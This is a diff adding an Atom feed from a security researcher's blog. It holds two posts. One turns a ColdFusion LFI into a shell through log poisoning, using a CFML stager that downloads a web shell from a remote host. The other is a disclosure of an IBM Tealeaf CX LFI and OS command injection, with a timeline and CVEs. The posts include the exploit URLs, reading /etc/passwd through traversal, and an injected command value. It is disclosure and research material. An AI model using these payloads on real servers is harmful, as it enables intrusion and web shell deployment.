@@ -1,0 +1,174 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: lfi | ]]></title>
+  <link href="http://hatRiot.github.io/blog/categories/lfi/atom.xml" rel="self"/>
+  <link href="http://hatRiot.github.io/"/>
+  <updated>2018-05-18T09:39:16-07:00</updated>
+  <id>http://hatRiot.github.io/</id>
+  <author>
+    <name><![CDATA[Bryan Alexander]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[LFI to shell in Coldfusion 6-10]]></title>
+    <link href="http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/"/>
+    <updated>2014-04-02T14:10:04-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion</id>
+    <content type="html"><![CDATA[<p>ColdFusion has <a href="http://www.blackhatlibrary.net/Coldfusion_hacking">several</a> very popular LFI&rsquo;s that are often used to fetch CF hashes, which can then be passed or cracked/reversed.  A lesser use of this LFI, one that I haven&rsquo;t seen documented as of yet, is actually obtaining a shell.  When you can&rsquo;t crack or pass, what&rsquo;s left?</p>
+
+<p>The less-than-obvious solution is to exploit CFML&rsquo;s parser, which acts much in the same way that PHP does when used in HTML.  You can embed PHP into any HTML page, at any location, because of the way the PHP interpreter searches a document for executable code.  This is the foundational basis of log poisoning.  CFML acts in much the same way, and we can use these LFI&rsquo;s to inject CFML and execute it on the remote system.</p>
+
+<p>Let&rsquo;s begin by first identifying the LFI; I&rsquo;ll be using ColdFusion 8 as example.  CF8&rsquo;s LFI lies in the locale parameter:</p>
+
+<p><code>
+http://192.168.1.219:8500/CFIDE/administrator/enter.cfm?local=../../../../../../../../ColdFusion8\logs\application.log%00en
+</code></p>
+
+<p>When exploited, this will dump the contents of <code>application.log</code>, a logging file that stores error messages.</p>
+
+<p><img src="/images/posts/2014/cf_log.jpg"></p>
+
+<p>We can write to this file by triggering an error, such as attempting to access a nonexistent CFML page.  This log also fails to sanitize data, allowing us to inject any sort of characters we want; including CFML code.</p>
+
+<p>The idea for this is to inject a simple stager payload that will then pull down and store our real payload; in this case, a web shell (something like fuze).  The stager I came up with is as follows:</p>
+
+<p><code>
+&lt;cfhttp method='get' url='#ToString(ToBinary('aHR0cDovLzE5Mi4xNjguMS45Nzo4MDAwL2NtZC5jZm1s'))#' path='#ExpandPath(ToString(ToBinary('Li4vLi4v')))#' file='cmd.cfml'&gt;
+</code></p>
+
+<p>The <code>cfhttp</code> tag is used to execute an HTTP request for our real payload, the URL of which is base64&rsquo;d to avoid some encoding issues with forward slashes.  We then expand the local path to <code>../../</code> which drops us into <code>wwwroot</code>, which is the first directory accessible from the web server.</p>
+
+<p>Once the stager is injected, we only need to exploit the LFI to retrieve the log file and execute our CFML code:</p>
+
+<p><img src="/images/posts/2014/cf_log_fetch.jpg"></p>
+
+<p>Which we can then access from the root directory:</p>
+
+<p><img src="/images/posts/2014/cf_log_exec.jpg"></p>
+
+<p>A quick run of this in clusterd:</p>
+
+<p>```
+$ ./clusterd.py -i 192.168.1.219 -a coldfusion -p8500 -v8 &mdash;deployer lfi_stager &mdash;deploy ./src/lib/resources/cmd.cfml</p>
+
+<pre><code>    clusterd/0.2.1 - clustered attack toolkit
+        [Supporting 5 platforms]
+</code></pre>
+
+<p> [2014-04-02 11:28PM] Started at 2014-04-02 11:28PM
+ [2014-04-02 11:28PM] Servers' OS hinted at windows
+ [2014-04-02 11:28PM] Fingerprinting host &lsquo;192.168.1.219&rsquo;
+ [2014-04-02 11:28PM] Server hinted at &lsquo;coldfusion&rsquo;
+ [2014-04-02 11:28PM] Checking coldfusion version 8.0 ColdFusion Manager&hellip;
+ [2014-04-02 11:28PM] Matched 1 fingerprints for service coldfusion
+ [2014-04-02 11:28PM]   ColdFusion Manager (version 8.0)
+ [2014-04-02 11:28PM] Fingerprinting completed.
+ [2014-04-02 11:28PM] Injecting stager&hellip;
+ [2014-04-02 11:28PM] Waiting for remote server to download file [7s]]
+ [2014-04-02 11:28PM] cmd.cfml deployed at /cmd.cfml
+ [2014-04-02 11:28PM] Finished at 2014-04-02 11:28PM</p>
+
+<p>```</p>
+
+<p>The downside to this method is remnance in a log file, which cannot be purged unless the CF server is shutdown (except in CF10).  It also means that the CFML file, if using the web shell, will be hanging around the filesystem.  An alternative is to inject a web shell that exists on-demand, that is, check if an argument is provided to the LFI and only parse and execute then.</p>
+
+<p>A working deployer for this can be found in the latest release of clusterd (v0.2.1).  It is also worth noting that this method is applicable to other CFML engines; details on that, and a working proof of concept, in the near future.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[IBM Tealeaf CX (v8 Release 8) Remote OS Command Injection / LFI]]></title>
+    <link href="http://hatRiot.github.io/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi/"/>
+    <updated>2014-03-26T22:51:11-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi</id>
+    <content type="html"><![CDATA[<p>Tealeaf Technologies was <a href="http://techcrunch.com/2012/05/02/ibm-acquires-tealeaf-to-add-customer-buying-analytics-to-smarter-commerce-products/">purchased</a> by IBM in May of 2012, and is a customer buying analytics application.  Essentially, an administrator will configure a Tealeaf server that accepts analytic data from remote servers, which it then generates various models, graphs, reports, etc based on the aggregate of data.
+Their analytics status/server monitoring application is vulnerable to a fairly trivial OS command injection vulnerability, as well as local file inclusion.  This vulnerability was discovered on a PCI engagement against a large retailer; the LFI was used to pull PHP files and hunt for RCE.</p>
+
+<p>The entire application is served up by default on port 8080 and is developed in PHP.  Authentication by default is disabled, however, support for Basic Auth appears to exist.  This interface allows administrators access to statistics, logs, participating servers, and more.  Contained therein is the ability to obtain application logs, such as configuration, maintenance, access, and more.  The log parameter is vulnerable to LFI:</p>
+
+<p>```
+if(array_key_exists(&ldquo;log&rdquo;, $params))
+$path = $config->logfiledir() . &ldquo;/&rdquo; . $params[&ldquo;log&rdquo;];</p>
+
+<p>$file = basename($path);
+$size = filesize($path);</p>
+
+<p>// Set the cache-control and expiration date so that the file expires
+// immediately after download.
+//
+$rfc1123date = gmdate(&rsquo;D, d M Y H:i:s T', 1);
+header(&lsquo;Cache-Control: max-age=0, must-revalidate, post-check=0, pre-check=0&rsquo;);
+header(&ldquo;Expires: &rdquo; . $rfc1123date);</p>
+
+<p>header(&ldquo;Content-Type: application/octet-stream&rdquo;);
+header(&ldquo;Content-Disposition: attachment; filename=$file;&rdquo;);
+header(&ldquo;Content-Length: $size;&rdquo;);</p>
+
+<p>readfile($path);
+```</p>
+
+<p>The URL then is <code>http://host:8080/download.php?log=../../../etc/passwd</code></p>
+
+<p>Tealeaf also suffers from a rather trivial remote OS command injection vulnerability.  Under the Delivery tab, there exists the option to ping remote servers that send data back to the mothership.  Do you see where this is going?</p>
+
+<p>```
+if ($_POST[&ldquo;perform_action&rdquo;] == &ldquo;testconn&rdquo;) {</p>
+
+<pre><code>$host = $_POST["testconn_host"];
+$port = $_POST["testconn_port"];
+$use_t = strtolower($_POST["testconn_t"]) == "true" ? true : false;
+$command = $GLOBALS["config"]-&gt;testconn_program() . ' ';
+if($use_t)
+$output = trim(shell_command_output($command . $host . " -p " . $port . " -t"));
+else
+$output = trim(shell_command_output($command . $host . " -p " . $port));
+
+if($output != "") {
+    $alert_function = "alert('" . str_replace("\n", "\\n",
+    htmlentities($output, ENT_QUOTES)) . "')";
+}
+
+$_SESSION['delivery']-&gt;pending_changes = $orig_pending_changes;
+</code></pre>
+
+<p>}
+```</p>
+
+<p>And shell_command_output:</p>
+
+<p>```
+function shell_command_output($command) {</p>
+
+<pre><code>$result = `$command 2&gt;&amp;1`;
+if (strlen($result) &gt; 0)
+return $result;
+</code></pre>
+
+<p>}
+```</p>
+
+<p>Harnessing the <code>$host</code> variable, we can inject arbitrary commands to run under the context of the process user, which by default is <code>ctccap</code>.  In order to exploit this without hanging processes or goofing up flow, I injected the following as the host variable: <code>8.8.8.8 -c 1 ; whoami ; ping 8.8.8.8 -c 1</code>.</p>
+
+<h3>Timeline</h3>
+
+
+<ul>
+<li>11/08/2013: IBM vulnerability submitted</li>
+<li>11/09/2013: IBM acknowledge vulnerability and assign internal advisory ID</li>
+<li>12/05/2013: Request for status update</li>
+<li>01/06/2014: Second request for status update</li>
+<li>01/23/2014: IBM responds with a target patch date set for &ldquo;another few months&rdquo;</li>
+<li>03/26/2014: IBM posts advisory, assigns CVE-2013-6719 and CVE-2013-6720</li>
+</ul>
+
+
+<p><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21667630">Advisory</a><br/>
+<a href="http://www.exploit-db.com/exploits/32546/">exploit-db PoC</a></p>
+]]></content>
+  </entry>
+  
+</feed>
